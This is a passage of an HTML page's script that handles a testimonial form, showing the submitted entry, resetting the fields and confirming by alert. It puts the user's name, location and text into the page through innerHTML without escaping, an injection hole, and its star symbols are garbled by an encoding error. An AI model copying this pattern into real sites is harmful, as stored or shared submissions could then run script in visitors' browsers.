            const location = document.getElementById('testimonial-location').value.trim();
            const text = document.getElementById('testimonial-text').value.trim();
            const rating = document.getElementById('testimonial-rating').value;
            
            if (!name || !text) {
                alert('Please fill in all required fields');
                return;
            }
            
            // Create new testimonial element
            const testimonialsContainer = document.querySelector('.testimonials');
            const newTestimonial = document.createElement('div');
            newTestimonial.className = 'testimonial';
            
            let stars = '';
            if (rating) {
                stars = '<div class="testimonial-rating">';
                for (let i = 0; i < 5; i++) {
                    stars += i < parseInt(rating) ? 'â˜…' : 'â˜†';
                }
                stars += '</div>';
            }
            
            newTestimonial.innerHTML = `
                <div class="testimonial-header">
                    <i class="fas fa-user-circle fa-3x"></i>
                    <div class="testimonial-author">
                        <p class="author">${name}${location ? ', ' + location : ''}</p>
                        ${stars}
                        <span class="verified-badge">
                            <i class="fas fa-check-circle"></i> New Submission
                        </span>
                    </div>
                </div>
                <p>"${text}"</p>
            `;
            // Add to beginning of testimonials
            testimonialsContainer.insertBefore(newTestimonial, testimonialsContainer.firstChild);
            
            // Clear form
            document.getElementById('testimonial-name').value = '';
            document.getElementById('testimonial-location').value = '';
            document.getElementById('testimonial-text').value = '';
            document.getElementById('testimonial-rating').value = '';
            
            // Show confirmation
            alert('Thank you for your testimonial!');
            
            // You could also send this data to your server here
            // sendTestimonialToServer(name, location, text, rating);
        });
    </script>
</body>
</html>